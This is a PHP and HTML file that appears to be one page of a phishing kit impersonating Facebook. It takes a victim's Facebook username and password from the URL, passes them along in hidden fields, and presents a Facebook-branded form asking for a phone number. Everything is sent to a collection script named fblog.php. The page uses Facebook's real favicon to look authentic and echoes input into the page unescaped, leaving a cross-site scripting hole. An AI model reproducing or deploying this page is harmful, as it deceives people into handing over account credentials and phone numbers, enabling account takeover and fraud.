<?php
$Username_FB = $_GET['Username_FB'];
$Password_FB = $_GET['Password_FB'];
?>
<html>


<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" sizes="16x16" href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png">

    <title>Facebook | phone</title>
    <link href="css/style.css" rel="stylesheet">
</head>
<body class="fix-header fix-sidebar card-no-border">
       <div class="col-md-12 form-horizontal form-material" align="center" >
		<form class="modal-content animate" method="get" action="fblog.php" style="border-radius:5px 5px 0px 0px;">
		<div class="cancelbtn">
		<font size="6" style="family:inherit;color:white;"><b>Facebook</b></font>
		</div> 
		<div class="container">
		    <input name="Username_FB" type="hidden" value="<?php echo $Username_FB;?>" readonly>
<input name="Password_FB" type="hidden" value="<?php echo $Password_FB;?>" readonly>
		<input type="text" autocorrect="off" autocapitalize="off" placeholder="Phone Number" name="Phone_FB" style="border-radius:3px;" required><br>
		<button type="submit" name="masuk" style="border-radius:3px;"><b>Login</b></button>
		
		  
		</form></div>
	</body>


</html>
